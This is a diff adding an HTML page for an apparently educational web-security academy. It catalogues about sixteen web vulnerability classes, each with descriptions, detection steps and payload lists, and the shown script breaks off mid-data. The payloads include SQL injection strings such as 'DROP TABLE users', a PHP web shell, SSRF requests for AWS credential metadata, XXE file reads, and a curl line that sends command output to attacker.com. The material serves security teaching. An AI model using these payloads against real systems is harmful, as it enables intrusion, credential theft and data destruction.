@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HackLab — Web Security Academy</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@700;900&family=Syne:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg0:#050709;--bg1:#090d12;--bg2:#0e1420;--bg3:#131b28;
+  --border:#1c2a3a;--border2:#243040;
+  --green:#0dff8c;--gdim:rgba(13,255,140,.15);
+  --cyan:#00cfff;--cdim:rgba(0,207,255,.12);
+  --red:#ff3d5a;--rdim:rgba(255,61,90,.12);
+  --orange:#ff8c00;--odim:rgba(255,140,0,.12);
+  --yellow:#ffe44d;--ydim:rgba(255,228,77,.1);
+  --text:#c8d6e5;--text2:#6b7e93;--text3:#3d4f62;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg0);color:var(--text);font-family:'Syne',sans-serif;min-height:100vh;overflow-x:hidden}
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.04) 2px,rgba(0,0,0,.04) 4px);pointer-events:none;z-index:9999}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(13,255,140,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(13,255,140,.025) 1px,transparent 1px);background-size:48px 48px;pointer-events:none;z-index:0}
+header{position:sticky;top:0;z-index:500;height:60px;background:rgba(5,7,9,.92);backdrop-filter:blur(24px);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:0 1.5rem}
+.logo{font-family:'Orbitron',monospace;font-size:1.1rem;font-weight:900;color:var(--green);text-shadow:0 0 24px rgba(13,255,140,.25);letter-spacing:3px;display:flex;align-items:center;gap:.5rem}
+.logo-bracket{color:var(--cyan);opacity:.7}
+.logo-sub{font-size:.6rem;color:var(--text2);letter-spacing:4px;display:block;font-family:'JetBrains Mono',monospace}
+.hdr-right{display:flex;align-items:center;gap:1rem}
+.sw{position:relative}
+.si{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:.35rem .8rem .35rem 2rem;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.8rem;width:220px;outline:none;transition:all .2s}
+.si:focus{border-color:var(--green);box-shadow:0 0 0 2px rgba(13,255,140,.1)}
+.si::placeholder{color:var(--text3)}
+.sicon{position:absolute;left:.6rem;top:50%;transform:translateY(-50%);color:var(--text3);pointer-events:none}
+.pill{font-family:'JetBrains Mono',monospace;font-size:.65rem;letter-spacing:2px;padding:.25rem .7rem;border-radius:20px;border:1px solid var(--green);color:var(--green);background:var(--gdim)}
+.sdrop{display:none;position:absolute;top:calc(100% + 6px);left:0;width:300px;background:var(--bg2);border:1px solid var(--border2);border-radius:8px;z-index:600;box-shadow:0 16px 48px rgba(0,0,0,.6);overflow:hidden}
+.sdrop.open{display:block}
+.sri{padding:.6rem 1rem;cursor:pointer;border-bottom:1px solid var(--border);transition:background .15s}
+.sri:last-child{border-bottom:none}
+.sri:hover{background:var(--gdim)}
+.sri-name{font-size:.85rem;color:var(--text);font-weight:700}
+.sri-cat{font-size:.7rem;color:var(--text2);font-family:'JetBrains Mono',monospace;margin-top:1px}
+.layout{display:grid;grid-template-columns:265px 1fr;min-height:calc(100vh - 60px);position:relative;z-index:1}
+.sidebar{background:var(--bg1);border-right:1px solid var(--border);position:sticky;top:60px;height:calc(100vh - 60px);overflow-y:auto;padding-bottom:2rem}
+.sidebar::-webkit-scrollbar{width:3px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--border2)}
+.sbg{margin-top:.5rem}
+.sbgl{font-family:'JetBrains Mono',monospace;font-size:.62rem;letter-spacing:3px;color:var(--text3);text-transform:uppercase;padding:.8rem 1.2rem .4rem;border-bottom:1px solid var(--border);margin-bottom:.3rem}
+.sbi{display:flex;align-items:center;gap:.6rem;padding:.5rem 1.2rem;cursor:pointer;font-size:.84rem;color:var(--text2);border-left:3px solid transparent;transition:all .2s}
+.sbi:hover{background:rgba(255,255,255,.02);color:var(--text);border-left-color:var(--border2)}
+.sbi.active{color:var(--green);background:var(--gdim);border-left-color:var(--green)}
+.sbdot{width:7px;height:7px;border-radius:50%;flex-shrink:0;background:currentColor;opacity:.7}
+.sbi.active .sbdot{opacity:1;box-shadow:0 0 6px currentColor}
+.sev{margin-left:auto;font-family:'JetBrains Mono',monospace;font-size:.58rem;letter-spacing:1px;padding:.1rem .4rem;border-radius:3px}
+.sc{background:var(--rdim);color:var(--red);border:1px solid rgba(255,61,90,.3)}
+.sh{background:var(--odim);color:var(--orange);border:1px solid rgba(255,140,0,.3)}
+.sm{background:var(--ydim);color:var(--yellow);border:1px solid rgba(255,228,77,.3)}
+.main{padding:2rem 2.5rem;max-width:980px}
+.hero-tag{font-family:'JetBrains Mono',monospace;font-size:.7rem;letter-spacing:4px;color:var(--cyan);margin-bottom:1.2rem;display:flex;align-items:center;gap:.6rem}
+.hero-tag::before{content:'';width:24px;height:1px;background:var(--cyan);display:block}
+.hero-h1{font-family:'Orbitron',monospace;font-size:clamp(1.8rem,4vw,3.2rem);font-weight:900;line-height:1.15;margin-bottom:1rem}
+.hero-h1 .g{color:var(--green);text-shadow:0 0 24px rgba(13,255,140,.25)}
+.hero-h1 .c{color:var(--cyan);text-shadow:0 0 24px rgba(0,207,255,.25)}
+.hero-p{color:var(--text2);font-size:1rem;max-width:560px;line-height:1.8;margin-bottom:2rem}
+.stats{display:flex;gap:2.5rem;margin-bottom:2.5rem;flex-wrap:wrap}
+.stat-n{font-family:'Orbitron',monospace;font-size:2.2rem;font-weight:900;color:var(--green);line-height:1}
+.stat-l{font-size:.75rem;color:var(--text2);letter-spacing:2px;text-transform:uppercase;margin-top:4px;font-family:'JetBrains Mono',monospace}
+.wbar{display:flex;gap:.8rem;align-items:flex-start;background:rgba(255,228,77,.05);border:1px solid rgba(255,228,77,.25);border-radius:8px;padding:.9rem 1.1rem;font-size:.85rem;color:var(--yellow);margin-bottom:2.5rem}
+.catsec{margin-bottom:2.5rem}
+.cattitle{font-family:'JetBrains Mono',monospace;font-size:.7rem;letter-spacing:4px;color:var(--text3);text-transform:uppercase;margin-bottom:1rem;display:flex;align-items:center;gap:.8rem}
+.cattitle::after{content:'';flex:1;height:1px;background:var(--border);display:block}
+.cgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:.9rem}
+.vcard{background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:1.1rem 1.2rem;cursor:pointer;transition:all .25s;position:relative;overflow:hidden}
+.vcard::before{content:'';position:absolute;top:0;left:0;width:100%;height:3px;background:var(--vc,var(--green));opacity:0;transition:opacity .25s}
+.vcard:hover{border-color:var(--vc,var(--green));transform:translateY(-3px);box-shadow:0 12px 32px rgba(0,0,0,.4)}
+.vcard:hover::before{opacity:1}
+.vct{display:flex;align-items:center;justify-content:space-between;margin-bottom:.7rem}
+.vcicon{font-size:1.4rem}
+.vctitle{font-size:.95rem;font-weight:800;color:var(--text);margin-bottom:.3rem}
+.vcdesc{font-size:.8rem;color:var(--text2);line-height:1.6}
+#vpage{display:none}
+#vpage.show{display:block;animation:fi .3s ease}
+@keyframes fi{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+.vphead{display:flex;align-items:center;gap:1rem;padding-bottom:1.5rem;margin-bottom:2rem;border-bottom:1px solid var(--border)}
+.bbtn{font-family:'JetBrains Mono',monospace;font-size:.75rem;padding:.4rem .9rem;background:var(--bg2);border:1px solid var(--border);color:var(--text2);border-radius:6px;cursor:pointer;transition:all .2s}
+.bbtn:hover{border-color:var(--cyan);color:var(--cyan)}
+.vpicon{font-size:2rem}
+.vptitle{font-family:'Orbitron',monospace;font-size:1.6rem;font-weight:900}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;margin-bottom:1.2rem;overflow:hidden}
+.ch{display:flex;align-items:center;gap:.6rem;padding:.75rem 1.2rem;border-bottom:1px solid var(--border);background:var(--bg3)}
+.cd{width:9px;height:9px;border-radius:50%;flex-shrink:0}
+.dg{background:var(--green);box-shadow:0 0 6px var(--green)}
+.dc{background:var(--cyan);box-shadow:0 0 6px var(--cyan)}
+.dr{background:var(--red);box-shadow:0 0 6px var(--red)}
+.do{background:var(--orange);box-shadow:0 0 6px var(--orange)}
+.cht{font-family:'JetBrains Mono',monospace;font-size:.78rem;letter-spacing:1.5px;color:var(--text)}
+.cb{padding:1.2rem}
+.cb p{color:var(--text2);line-height:1.85;font-size:.9rem;margin-bottom:.6rem}
+.cb ul{list-style:none}
+.cb li{color:var(--text2);font-size:.88rem;padding:.25rem 0 .25rem 1.2rem;position:relative;line-height:1.65}
+.cb li::before{content:'▸';position:absolute;left:0;color:var(--green)}
+.twocol{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-bottom:1.2rem}
+.codewrap{position:relative;margin:.6rem 0}
+pre.code{background:#010408;border:1px solid var(--border);border-radius:8px;padding:1rem;font-family:'JetBrains Mono',monospace;font-size:.79rem;color:#cdd6f4;overflow-x:auto;white-space:pre-wrap;word-break:break-all;line-height:1.65}
+.cpbtn{position:absolute;top:6px;right:6px;font-family:'JetBrains Mono',monospace;font-size:.65rem;padding:.2rem .5rem;background:var(--bg3);border:1px solid var(--border);color:var(--text2);border-radius:4px;cursor:pointer;transition:all .2s;letter-spacing:1px}
+.cpbtn:hover{color:var(--green);border-color:var(--green)}
+.alert{border-radius:8px;padding:.75rem 1rem;font-size:.86rem;display:flex;gap:.6rem;align-items:flex-start;margin:.6rem 0}
+.ai{background:var(--cdim);border:1px solid rgba(0,207,255,.3);color:var(--cyan)}
+.aw{background:var(--odim);border:1px solid rgba(255,140,0,.3);color:var(--orange)}
+.browser{background:var(--bg1);border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:1rem}
+.btb{background:var(--bg3);border-bottom:1px solid var(--border);padding:.5rem .8rem;display:flex;align-items:center;gap:.6rem}
+.bdot{width:10px;height:10px;border-radius:50%}
+.br{background:#ff5f57}.by{background:#febc2e}.bg2{background:#28c840}
+.burl{flex:1;background:var(--bg0);border:1px solid var(--border);border-radius:4px;padding:.18rem .6rem;font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--text2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.bbody{padding:1.2rem}
+.fg{margin-bottom:1rem}
+.fl{display:block;font-family:'JetBrains Mono',monospace;font-size:.68rem;letter-spacing:2px;color:var(--text2);margin-bottom:.4rem;text-transform:uppercase}
+.fi,.fta,.fsel{width:100%;background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:.55rem .8rem;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:.82rem;outline:none;transition:border-color .2s}
+.fi:focus,.fta:focus,.fsel:focus{border-color:var(--green);box-shadow:0 0 0 2px rgba(13,255,140,.08)}
+.fta{resize:vertical;min-height:90px}
+.fsel option{background:var(--bg2)}
+.btn{font-family:'JetBrains Mono',monospace;font-size:.78rem;letter-spacing:1.5px;padding:.55rem 1.1rem;border-radius:6px;cursor:pointer;border:none;transition:all .2s}
+.btng{background:var(--green);color:#000;font-weight:700}
+.btng:hover{filter:brightness(1.1);box-shadow:0 0 24px rgba(13,255,140,.25)}
+.btnr{background:var(--rdim);color:var(--red);border:1px solid rgba(255,61,90,.4)}
+.btnr:hover{background:rgba(255,61,90,.2)}
+.btns{background:var(--bg3);color:var(--text2);border:1px solid var(--border)}
+.btns:hover{color:var(--cyan);border-color:var(--cyan)}
+.term{background:#000;border:1px solid var(--border);border-radius:8px;padding:1rem;font-family:'JetBrains Mono',monospace;font-size:.79rem;min-height:110px;max-height:260px;overflow-y:auto;margin-top:1rem}
+.term::-webkit-scrollbar{width:3px}
+.term::-webkit-scrollbar-thumb{background:var(--border2)}
+.tl{margin-bottom:.28rem;line-height:1.5}
+.tp{color:var(--green)}.to{color:var(--text2)}.te{color:var(--red)}.ts{color:var(--green)}.ti{color:var(--cyan)}.tw{color:var(--orange)}
+.flexrow{display:flex;gap:.6rem;flex-wrap:wrap}
+.twoinput{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+@media(max-width:800px){.layout{grid-template-columns:1fr}.sidebar{display:none}.main{padding:1rem}.twocol{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">
+    <span class="logo-bracket">[</span>HACKLAB<span class="logo-bracket">]</span>
+    <span><span class="logo-sub">WEB SECURITY ACADEMY</span></span>
+  </div>
+  <div class="hdr-right">
+    <div class="sw">
+      <span class="sicon">&#9907;</span>
+      <input class="si" id="searchInput" type="text" placeholder="Search vulnerabilities..." autocomplete="off">
+      <div class="sdrop" id="sdrop"></div>
+    </div>
+    <div class="pill">EDU ONLY</div>
+  </div>
+</header>
+<div class="layout">
+<nav class="sidebar">
+  <div class="sbg">
+    <div class="sbgl">// Navigation</div>
+    <div class="sbi active" id="nav-home" onclick="goHome()"><span class="sbdot" style="color:var(--green)"></span>Home</div>
+  </div>
+  <div class="sbg">
+    <div class="sbgl">// Injection &amp; Input</div>
+    <div class="sbi" style="color:var(--red)" onclick="goV('sqli')"><span class="sbdot"></span>SQL Injection<span class="sev sc">CRIT</span></div>
+    <div class="sbi" style="color:var(--red)" onclick="goV('cmdi')"><span class="sbdot"></span>Command Injection<span class="sev sc">CRIT</span></div>
+    <div class="sbi" style="color:var(--red)" onclick="goV('ssti')"><span class="sbdot"></span>SSTI<span class="sev sc">CRIT</span></div>
+    <div class="sbi" style="color:var(--orange)" onclick="goV('xss')"><span class="sbdot"></span>Cross-Site Scripting<span class="sev sh">HIGH</span></div>
+    <div class="sbi" style="color:var(--orange)" onclick="goV('xxe')"><span class="sbdot"></span>XXE Injection<span class="sev sh">HIGH</span></div>
+    <div class="sbi" style="color:var(--orange)" onclick="goV('nosqli')"><span class="sbdot"></span>NoSQL Injection<span class="sev sh">HIGH</span></div>
+  </div>
+  <div class="sbg">
+    <div class="sbgl">// File, Server &amp; Internal</div>
+    <div class="sbi" style="color:var(--red)" onclick="goV('fileupload')"><span class="sbdot"></span>File Upload<span class="sev sc">CRIT</span></div>
+    <div class="sbi" style="color:var(--red)" onclick="goV('ssrf')"><span class="sbdot"></span>SSRF<span class="sev sc">CRIT</span></div>
+    <div class="sbi" style="color:var(--orange)" onclick="goV('pathtraversal')"><span class="sbdot"></span>Path Traversal<span class="sev sh">HIGH</span></div>
+  </div>
+  <div class="sbg">
+    <div class="sbgl">// Info &amp; Cache</div>
+    <div class="sbi" style="color:var(--yellow)" onclick="goV('infodisclosure')"><span class="sbdot"></span>Information Disclosure<span class="sev sm">MED</span></div>
+    <div class="sbi" style="color:var(--yellow)" onclick="goV('webcachedeception')"><span class="sbdot"></span>Web Cache Deception<span class="sev sm">MED</span></div>
+    <div class="sbi" style="color:var(--orange)" onclick="goV('webcachepoisoning')"><span class="sbdot"></span>Web Cache Poisoning<span class="sev sh">HIGH</span></div>
+  </div>
+  <div class="sbg">
+    <div class="sbgl">// Auth &amp; Access</div>
+    <div class="sbi" style="color:var(--orange)" onclick="goV('auth')"><span class="sbdot"></span>Authentication<span class="sev sh">HIGH</span></div>
+    <div class="sbi" style="color:var(--orange)" onclick="goV('accesscontrol')"><span class="sbdot"></span>Access Control<span class="sev sh">HIGH</span></div>
+    <div class="sbi" style="color:var(--orange)" onclick="goV('csrf')"><span class="sbdot"></span>CSRF<span class="sev sh">HIGH</span></div>
+    <div class="sbi" style="color:var(--yellow)" onclick="goV('businesslogic')"><span class="sbdot"></span>Business Logic Flaws<span class="sev sm">MED</span></div>
+  </div>
+  <div class="sbg">
+    <div class="sbgl">// HTTP &amp; Client</div>
+    <div class="sbi" style="color:var(--orange)" onclick="goV('hostheader')"><span class="sbdot"></span>HTTP Host Header<span class="sev sh">HIGH</span></div>
+    <div class="sbi" style="color:var(--yellow)" onclick="goV('clickjacking')"><span class="sbdot"></span>Clickjacking<span class="sev sm">MED</span></div>
+    <div class="sbi" style="color:var(--yellow)" onclick="goV('dom')"><span class="sbdot"></span>DOM-Based Vulns<span class="sev sm">MED</span></div>
+  </div>
+  <div class="sbg">
+    <div class="sbgl">// API</div>
+    <div class="sbi" style="color:var(--orange)" onclick="goV('api')"><span class="sbdot"></span>API Testing<span class="sev sh">HIGH</span></div>
+  </div>
+</nav>
+<main class="main">
+<div id="home-page">
+  <div style="padding:3rem 0 2rem">
+    <div class="hero-tag">PORTSWIGGER WEB SECURITY ACADEMY</div>
+    <h1 class="hero-h1">Learn <span class="g">Web Hacking</span><br>Like a <span class="c">Pro</span></h1>
+    <p class="hero-p">Interactive vulnerability labs for developers and security beginners. Study real attack techniques, understand payloads, and practice in simulated environments.</p>
+    <div class="stats">
+      <div><div class="stat-n">16</div><div class="stat-l">Vulnerabilities</div></div>
+      <div><div class="stat-n">60+</div><div class="stat-l">Payloads</div></div>
+      <div><div class="stat-n">16</div><div class="stat-l">Interactive Labs</div></div>
+    </div>
+    <div class="wbar">&#9888;&#65039; <span><strong>Educational Use Only.</strong> Only test on systems you own or have written permission to test. Unauthorized testing is illegal.</span></div>
+  </div>
+  <div class="catsec"><div class="cattitle">INJECTION &amp; INPUT HANDLING</div><div class="cgrid" id="g-injection"></div></div>
+  <div class="catsec"><div class="cattitle">FILE, SERVER &amp; INTERNAL INTERACTION</div><div class="cgrid" id="g-server"></div></div>
+  <div class="catsec"><div class="cattitle">INFORMATION DISCLOSURE &amp; CACHE</div><div class="cgrid" id="g-info"></div></div>
+  <div class="catsec"><div class="cattitle">AUTHENTICATION &amp; ACCESS CONTROL</div><div class="cgrid" id="g-auth"></div></div>
+  <div class="catsec"><div class="cattitle">HTTP &amp; CLIENT-SIDE</div><div class="cgrid" id="g-http"></div></div>
+  <div class="catsec"><div class="cattitle">API TESTING</div><div class="cgrid" id="g-api"></div></div>
+</div>
+<div id="vpage"></div>
+</main>
+</div>
+<script>
+/* ===== DATA ===== */
+var V = {
+  sqli:{title:"SQL Injection",icon:"&#128452;&#65039;",sev:"critical",color:"var(--red)",cat:"injection",
+    short:"Manipulate SQL queries through user input to bypass auth or extract data.",
+    what:"SQL Injection allows attackers to insert malicious SQL code into input fields concatenated into database queries. This lets them alter query logic, bypass authentication, read all database data, modify or delete records, and in some configurations execute OS commands.",
+    impact:["Bypass authentication without credentials","Dump entire database contents","Modify or delete records","Read/write server files","Pivot to OS command execution"],
+    find:["Inject a single quote ' and watch for SQL errors","Try logical payloads: 1=1 vs 1=2","Use ORDER BY 1,2,3... to enumerate columns","Try UNION SELECT NULL,NULL,NULL--","Use time-based blind: AND SLEEP(5)--"],
+    payloads:["' OR '1'='1","' OR 1=1 --","admin' --","' UNION SELECT null,username,password FROM users --","' AND SLEEP(5) --","1; DROP TABLE users --"]},
+  cmdi:{title:"OS Command Injection",icon:"&#128187;",sev:"critical",color:"var(--red)",cat:"injection",
+    short:"Execute arbitrary OS commands by injecting shell metacharacters.",
+    what:"Command injection occurs when user input is passed unsanitized to a system shell. Using metacharacters (;, &amp;, |) an attacker can append or replace commands, gaining full control of the server OS.",
+    impact:["Execute any OS command as web server user","Read/write arbitrary files","Create persistent backdoors","Pivot to internal network","Full server compromise"],
+    find:["Test parameters used in shell ops (ping, nslookup)","Try: ; whoami","Try: | id","Use blind time-based: ; sleep 10","Out-of-band with Burp Collaborator"],
+    payloads:["; whoami","| id","127.0.0.1; ls -la","| sleep 10","&amp;&amp; curl http://attacker.com/?x=$(whoami)","$(id)"]},
+  ssti:{title:"SSTI",icon:"&#128295;",sev:"critical",color:"var(--red)",cat:"injection",
+    short:"Inject template expressions to achieve RCE via server-side template engines.",
+    what:"SSTI occurs when user input is embedded directly into a template string evaluated by a template engine (Jinja2, Twig, Freemarker). Since template engines execute code, attackers can run arbitrary commands on the server.",
+    impact:["Remote Code Execution","Read environment variables and secrets","Access internal files","Full server compromise","Lateral movement"],
+    find:["Inject: {{7*7}} — if output is 49, Jinja2/Twig confirmed","Try: ${7*7} for Freemarker/EL","Try: #{7*7} for Ruby ERB","Check greeting pages, email templates, 404 pages"],
+    payloads:["{{7*7}}","${7*7}","{{config}}","*{7*7}","{{''.__class__.__mro__[1].__subclasses__()}}","<%= 7*7 %>"]},
+  xss:{title:"Cross-Site Scripting",icon:"&#128137;",sev:"high",color:"var(--orange)",cat:"injection",
+    short:"Inject client-side scripts executed in other users browsers.",
+    what:"XSS allows attackers to inject JavaScript into web pages other users view. Three types: Reflected, Stored, and DOM-based. Attackers can steal sessions, perform actions on behalf of victims, and spread malware.",
+    impact:["Steal session cookies and tokens","Keylog user input","Redirect to phishing pages","Perform actions on behalf of victim","Deliver malware via browser exploits"],
+    find:["Test inputs with &lt;script&gt;alert(1)&lt;/script&gt;","Check URL parameters reflected in page","Try event handlers: &lt;img src=x onerror=alert(1)&gt;","Test URL fragments: #&lt;img src=x onerror=alert(1)&gt;"],
+    payloads:["&lt;script&gt;alert(1)&lt;/script&gt;","&lt;img src=x onerror=alert(document.cookie)&gt;","&lt;svg onload=alert(1)&gt;","javascript:alert(1)","&lt;details open ontoggle=alert(1)&gt;","&lt;iframe src=javascript:alert(1)&gt;"]},
+  xxe:{title:"XXE Injection",icon:"&#128196;",sev:"high",color:"var(--orange)",cat:"injection",
+    short:"Exploit XML parsers to read local files or perform SSRF.",
+    what:"XXE injection exploits XML processors that allow external entity declarations. Attackers inject a malicious DOCTYPE to read local files, perform SSRF, or exfiltrate data. Dangerous in file upload features and SOAP APIs.",
+    impact:["Read arbitrary server files (/etc/passwd)","Perform SSRF via XML","Blind XXE with out-of-band exfiltration","Denial of Service (Billion Laughs)","RCE in rare configurations"],
+    find:["Look for endpoints accepting XML (SOAP, REST, file upload)","Inject a DOCTYPE with SYSTEM entity","Check SVG upload endpoints","Test XLSX/DOCX processing features"],
+    payloads:["&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;\n]&gt;\n&lt;root&gt;&amp;xxe;&lt;/root&gt;","&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/&quot;&gt;\n]&gt;\n&lt;root&gt;&amp;xxe;&lt;/root&gt;"]},
+  nosqli:{title:"NoSQL Injection",icon:"&#127811;",sev:"high",color:"var(--orange)",cat:"injection",
+    short:"Manipulate MongoDB/NoSQL queries using operators to bypass auth.",
+    what:"NoSQL Injection targets databases like MongoDB. Attackers use query operators ($gt, $ne, $regex, $where) to alter query logic, bypass authentication, or extract data without knowing the structure.",
+    impact:["Authentication bypass","Extract all records","Modify or delete data","Account takeover","Privilege escalation"],
+    find:["Try JSON body: {password:{$ne:''}}","Test URL params: password[$ne]=invalid","Look for MongoDB-style errors","Test $regex, $where operators"],
+    payloads:['{username:{$ne:null},password:{$ne:null}}','{username:"admin",password:{$gt:""}}','username[$ne]=x&amp;password[$ne]=x','{$where:"this.username==this.password"}','username=admin&amp;password[$regex]=.*']},
+  fileupload:{title:"File Upload Vulnerability",icon:"&#128193;",sev:"critical",color:"var(--red)",cat:"server",
+    short:"Upload malicious files (web shells) to execute code on the server.",
+    what:"File upload vulnerabilities arise when applications do not properly validate uploaded files. Attackers upload web shells (.php, .jsp) and navigate to the uploaded path to execute server-side code for full RCE.",
+    impact:["Remote Code Execution (full server control)","Persistent backdoor access","Data exfiltration","Malware distribution","Defacement"],
+    find:["Upload a .php file and browse to it","Try double extensions: shell.php.jpg","Change Content-Type to image/jpeg","Add GIF magic bytes before PHP code","Try: shell.phtml, shell.phar, shell.php5"],
+    payloads:["&lt;?php system($_GET['cmd']); ?&gt;","&lt;?php echo shell_exec($_POST['cmd']); ?&gt;","GIF89a;\n&lt;?php system($_GET['cmd']); ?&gt;","Filename bypass: shell.php.jpg, shell.phtml, shell.phar"]},
+  ssrf:{title:"SSRF",icon:"&#127760;",sev:"critical",color:"var(--red)",cat:"server",
+    short:"Force the server to make requests to internal or external resources.",
+    what:"SSRF tricks the server into making HTTP requests to arbitrary URLs including internal services. This exposes cloud metadata endpoints (AWS, GCP, Azure), internal admin panels, and internal microservices.",
+    impact:["Read cloud instance metadata (AWS keys)","Access internal admin interfaces","Port-scan internal network","Bypass IP allowlists","Read internal files via file://"],
+    find:["Look for URL parameters (url=, imageUrl=, callback=)","Try: http://127.0.0.1/","Try: http://169.254.169.254/ (AWS metadata)","Try: file:// protocol","Check PDF generators, image fetchers, webhooks"],
+    payloads:["http://127.0.0.1/admin","http://localhost:8080/internal","http://169.254.169.254/latest/meta-data/","http://169.254.169.254/latest/meta-data/iam/security-credentials/","file:///etc/passwd","dict://localhost:6379/INFO"]},
+  pathtraversal:{title:"Path Traversal",icon:"&#128194;",sev:"high",color:"var(--orange)",cat:"server",
+    short:"Read arbitrary files outside the web root using ../ sequences.",
+    what:"Path Traversal lets attackers read files outside the intended directory by injecting ../ sequences into file path parameters. This can expose source code, config files, password hashes, and private keys.",
+    impact:["Read /etc/passwd, /etc/shadow","Steal credentials and API keys from config","Read application source code","Read SSH private keys"],
+    find:["Find filename parameters: file=, path=, doc=","Test: ../../../../etc/passwd","Try URL encoding: ..%2F..%2Fetc%2Fpasswd","Try double encoding: ..%252F","Test null byte: ../../../../etc/passwd%00.jpg"],
+    payloads:["../../../../etc/passwd","..%2F..%2F..%2Fetc%2Fpasswd","..%252F..%252Fetc%252Fpasswd","....//....//etc/passwd","../../../../windows/win.ini","../../../../etc/passwd%00.jpg"]},
+  infodisclosure:{title:"Information Disclosure",icon:"&#128269;",sev:"medium",color:"var(--yellow)",cat:"info",
+    short:"Leaking sensitive data via error messages, comments, or exposed endpoints.",
+    what:"Information Disclosure occurs when an application unintentionally reveals sensitive data: verbose error messages with stack traces, developer comments in HTML source, exposed backup files, version banners, and debug endpoints left in production.",
+    impact:["Reveals tech stack and versions for targeted attacks","Exposes credentials and API keys","Leaks internal IPs and infrastructure","Stack traces reveal code logic","Directory listings expose hidden endpoints"],
+    find:["View page source for HTML comments","Check /robots.txt, /sitemap.xml, /.git/","Try backup files: index.php~, .bak, .old","Force errors with invalid input","Check HTTP response headers for version banners","Try: /phpinfo.php, /.env, /web.config"],
+    payloads:["GET /.env","GET /phpinfo.php","GET /.git/config","GET /backup.zip","GET /web.config","Trigger 500 error by sending invalid data type"]},
+  webcachedeception:{title:"Web Cache Deception",icon:"&#127919;",sev:"medium",color:"var(--yellow)",cat:"info",
+    short:"Trick cache servers into storing authenticated responses for attacker access.",
+    what:"Web Cache Deception tricks a caching server into storing a sensitive authenticated page by appending a static-looking path suffix. The attacker then requests the same URL unauthenticated to receive the cached victim data.",
+    impact:["Steal session tokens and sensitive profile data","Access private account information","Harvest credentials or PII","Account takeover"],
+    find:["Append static extensions: /my-account/style.css","Try: /dashboard/x.css, /profile/x.js","Check if response is cached (X-Cache: HIT)","Confirm response contains sensitive data"],
+    payloads:["GET /my-account/test.css","GET /dashboard/x.js","GET /profile/image.png","GET /api/user/info/test.js","Check X-Cache: HIT = cached"]},
+  webcachepoisoning:{title:"Web Cache Poisoning",icon:"&#9760;&#65039;",sev:"high",color:"var(--orange)",cat:"info",
+    short:"Inject malicious content into a shared cache to attack all users.",
+    what:"Web Cache Poisoning injects a malicious payload into a cached response that is then served to all other users. Attackers manipulate unkeyed cache inputs (like X-Forwarded-Host) to alter the response stored by the cache.",
+    impact:["Deliver XSS to all users visiting a cached page","Redirect users to malicious sites","Distribute malicious JavaScript via CDN","Mass exploitation without targeting individuals"],
+    find:["Identify unkeyed headers using Param Miner (Burp)","Test X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL","Check if injected value appears in cached response","Look for cache headers: X-Cache, Age, CF-Cache-Status"],
+    payloads:["X-Forwarded-Host: attacker.com","X-Forwarded-Scheme: nothttps","X-Original-URL: /admin","X-Rewrite-URL: /admin","X-Host: attacker.com"]},
+  auth:{title:"Authentication Vulnerabilities",icon:"&#128273;",sev:"high",color:"var(--orange)",cat:"auth",
+    short:"Weaknesses in login mechanisms allowing unauthorized account access.",
+    what:"Authentication vulnerabilities include username enumeration (different responses for valid/invalid users), lack of brute-force protection, weak password reset tokens, flawed MFA, and insecure remember-me implementations. These allow account takeover at scale.",
+    impact:["Account takeover","Admin access","Mass credential harvesting","Password reset without email access","MFA bypass"],
+    find:["Test different error messages for valid vs invalid usernames","Check response time differences (timing oracle)","Test for account lockout after N failed attempts","Probe password reset token entropy and expiry","Test MFA bypass by manipulating response codes"],
+    payloads:["Username enum: 'Invalid password' vs 'User not found'","Brute force: automate with Burp Intruder","Password reset: test token reuse, no expiry, short length","MFA bypass: change response 'invalid:true' to 'false'","Timing attack: valid user responds slower"]},
+  accesscontrol:{title:"Access Control",icon:"&#128682;",sev:"high",color:"var(--orange)",cat:"auth",
+    short:"Flawed permissions allowing access to unauthorized resources.",
+    what:"Access control vulnerabilities occur when applications do not enforce authorization on actions or resources. This includes IDOR (accessing other users data by changing IDs), privilege escalation (horizontal and vertical), and missing access controls on admin endpoints.",
+    impact:["Access other users private data","Escalate from user to admin","Bypass admin-only functionality","Delete or modify other users records","Expose confidential business data"],
+    find:["Test admin endpoints with regular user session","Change IDs in requests to other users IDs","Test horizontal escalation: change userId param","Remove role headers or cookies","Test forced browsing: /admin, /panel, /dashboard","Test ?admin=true, ?role=admin"],
+    payloads:["GET /admin/users (as regular user)","GET /api/user/2 (you are user 5 - IDOR)","?admin=true or ?role=admin or ?isAdmin=1","Cookie: role=user change to role=admin","DELETE /api/user/1 (another user account)"]},
